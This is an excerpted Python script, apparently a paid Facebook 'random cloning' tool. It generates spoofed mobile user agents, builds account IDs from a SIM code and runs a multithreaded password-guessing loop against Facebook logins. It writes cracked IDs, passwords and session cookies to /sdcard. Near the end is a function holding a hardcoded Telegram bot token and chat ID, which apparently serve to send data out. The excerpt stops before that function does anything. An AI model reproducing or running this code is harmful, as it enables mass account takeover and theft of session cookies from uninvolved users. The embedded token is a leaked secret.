...
for xd in range(10000):
	...
	c='i97 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,88)
	e='0'
...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Nokia T10 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='V2164A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,83)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SM-M336K Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,120)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='MI 8 Explorer Edition Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,120)
	e='0'
	f=random.randrange(1000,10000)
	g=random.randrange(20,100)
...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='M2101K7BNY Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,121)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='SM-G991B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,121)
	e='0'
	f=random.randrange(1000,10000)
	g=random.randrange(20,100)
...
\033[30;1m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
\033[30;1m[\033[1;32m=\033[1;31m]  \033[30;1mDeveloper \033[30;1m● \033[30;1mSHAKIB CHOWDHURY 
\033[30;1m[\033[1;32m=\033[1;31m]  \033[30;1mFacebook  \033[30;1m● \033[30;1mBABU CHOWDHURY 
\033[30;1m[\033[1;32m=\033[1;31m]  \033[30;1mVersion  \033[30;1m● \033[30;1mV.1.2
\033[30;1m[\033[1;32m=\033[1;31m]  \033[30;1mTools  \033[30;1m   ● \033[30;1mRANDOM CLONING
\033[30;1m[\033[1;32m=\033[1;31m]  \033[30;1mType  \033[30;1m    ● \033[30;1mPAID
\033[30;1m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆""")

linex=('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')   
#--------------------------(MENU BOX)--------------------------#
os.system(f'xdg-open https://facebook.com/groups/1287886157944652/')
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100006691301765')
import getpass
...
os.system('espeak -a 300 " Welcome,   to,  BABU. CHOWDHURY,  PAID,   Tools"')
def back():
	login()
...
while attemps < 12345677901:
    username = input('\033[30;1m[\033[30;1m√\033[30;1m]\033[30;1m ENTER USERNAME: ')
    password = input('\033[30;1m[\033[30;1m√\033[30;1m]\033[30;1m ENTER PASSWORD: ')

    if username == '3' and password == '4':
...
def v2():
    ...
    kode = input('\033[30;1m[\033[30;1m?\033[30;1m] SIM CODE : ')
    ...
    with ThreadPool(max_workers=30) as akash:
        ...
        print(logo)
        tl = str(len(user))
        print('\033[30;1m[\033[30;1m=\033[30;1m]\033[30;1m SIM CODE : '+kode)
        print('\033[30;1m[\033[30;1m=\033[30;1m]\033[30;1m CRACK ID : '+tl)
        print('\033[30;1m⋆\033[30;1m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'304050','607080 ',]
            akash.submit(rcrack1,uid,pwx,tl)
    print(linex)
    print('\033[30;1m[\033[30;1m~\033[30;1m] CRACK SUCCESSFULLY COMPLETED..')
    print(linex)
#--------------------------(MATHOD BOX)--------------------------#
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sSHAKIB \033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m[SHAKIB -OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                open('/sdcard/SHAKIB -OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;196m[SHAKIB -CP💔] {uid}|{ps}")
                open('/sdcard/SHAKIB -CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def suyaib():
    ...
    bot_token = '6737432760:AAH-9UmrPxaApbscRs4bib0d-hTfohuv-Xg' 
    chat_id = '6735393465'    
    #-------------( /sdcard\ )--------------#  
    #--------------------apk-------------------#																																							
    try:
